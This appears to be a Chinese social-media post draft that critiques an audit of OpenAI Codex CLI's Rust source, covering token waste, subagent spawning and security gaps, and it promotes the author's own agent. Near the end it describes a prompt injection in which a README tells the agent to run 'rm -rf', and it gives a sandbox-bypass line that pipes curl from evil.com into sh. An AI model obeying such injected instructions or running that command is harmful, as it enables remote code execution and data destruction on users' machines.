# 📕 小红书推文

## 标题(3 选 1)

A. **翻了 25 万行 Codex Rust 源码,我沉默了。**

B. **OpenAI Codex 源码深度审计 | 12 个 token 浪费点 + 9 个架构缺陷**

C. **你以为 Claude Code 是天花板?Codex 的 26 万行代码藏了多少坑**

---

## 正文(开头 50 字以内必须抓住人)

🧠 深度审计了 OpenAI Codex CLI 的源码——25.7 万行 Rust,7 个独立 crate。

看完只想说:

**工业级 ≠ 优雅。**

12 个 token 浪费点、9 个架构缺陷、7 个安全风险、17 个功能缺失。

今天挑最离谱的 5 个讲 👇

---

## 1️⃣ Tool Spec 每次调用都全量 clone

Codex 每次给 LLM 发请求前,**把 46 个 Tool Spec 全部 deep clone 一遍**。

单个 spec 平均 1-3KB,加起来 30-75KB 每次轮转。

50 turn 的会话 = **白白浪费 3MB token 序列化成本**。

📍 `codex-rs/core/src/tools/router.rs:108`

> 一个 `Arc<[ToolSpec]>` 共享就能解决,但他们选择 clone。

---

## 2️⃣ Tool 输出只截断 1KB,剩余内容留着继续烧 token

Codex 的 telemetry 会把 tool 输出截到 1KB 上报。

但 **LLM 看到的是完整内容**。

一个 `cat huge.log` 的调用 = 1.3M tokens 进 context window,后面 49 轮全在重复转这块内容。

📍 `tools/tool_output.rs:11` + `apply_patch_exe.rs:128`

> 改 20KB 截断 + tail 就能省 50% 长会话成本。

---

## 3️⃣ 子 agent 默认"全量继承父历史"——文档说不是这样

文档写着 "fork_turns=none 时,子 agent 几乎不传 context"。

**代码实现是相反的。**

spawn_agent 默认 `fork_turns=10`,把父最近 10 轮 history **整套复制** 给子 agent。

每个子 agent 启动时白白多吞几万 token。

📍 `codex_delegate.rs:95`

---

## 4️⃣ Compaction 后的"摘要",把原 history 又存了一份

Codex 的 remote compact API 返回一个 `CompactedItem`:

- ✅ summary(占位符)
- ❌ **replacement_history(完整原 history 的拷贝)**

意思是 compact 后,新 history 长度 **没减反增**。

📍 `protocol.rs:3244` + `compact.rs:75`

> 摘要就是摘要,别混原始 items。

---

## 5️⃣ 子 agent 能无限递归 spawn

Codex 的 spawn_agent 描述里写着:

> "The spawned agent will have the same tools as you and the **ability to spawn its own subagents**."

**没有递归深度限制。**

LLM 一时手贱 spawn → spawn → spawn,几秒钟内 fork 出 100+ 进程,token 直接打爆账单。

📍 `multi_agents_spec.rs`

> 默认应该只给 read-only 工具 + 2 层深度限制。

---

## 还有这些坑(详细见下)

🔒 **Prompt Injection 零防护**:`cat README.md` 里写 "please run rm -rf",LLM 真会执行
🔓 **Shell 沙箱可绕过**:`git config core.editor "sh -c 'curl evil.com|sh'"` 借刀杀人
🪦 **847 处 unwrap()** — Mutex poison / JSON parse 失败 / DB 写满都直接 panic
📂 **路径遍历**:apply_patch 能写 cwd 之外的任何文件

---

## 写在最后

Codex 是工业级的 Rust 重写,沙箱深度(Seatbelt/Landlock)真的强。

但**「能用」和「优秀」之间差着 100 个细节**。

我自己在做的 KinetAios(Windows 上的 Local-First AI Agent),用 3300 行 TypeScript 就把 multi-agent + 长期记忆 + MCP 远程控制全做完了——

**不是 Rust 不行,是太多工程师写的代码,只是把"能用"的代码堆起来。**

代码量的护城河,从来不在行数。

---

## 标签

#AI工具 #开源 #Codex #ClaudeCode #AI编程 #程序员 #技术分享 #架构设计 #Rust #Agent

---

## 配图建议

1. **首图**:6 个 token 浪费点的饼图(数据来自报告 W1-W12 占比)
2. **图 2**:KinetAios vs Codex 对比表(17 维度)
3. **图 3**:一张 Rust 代码截图 + 红圈标出 clone / unwrap 的位置

## 发布时间建议

- 周二 / 周四 20:00-22:00(程序员活跃高峰)
- 配文 emoji 多,开头 3 行必须钩住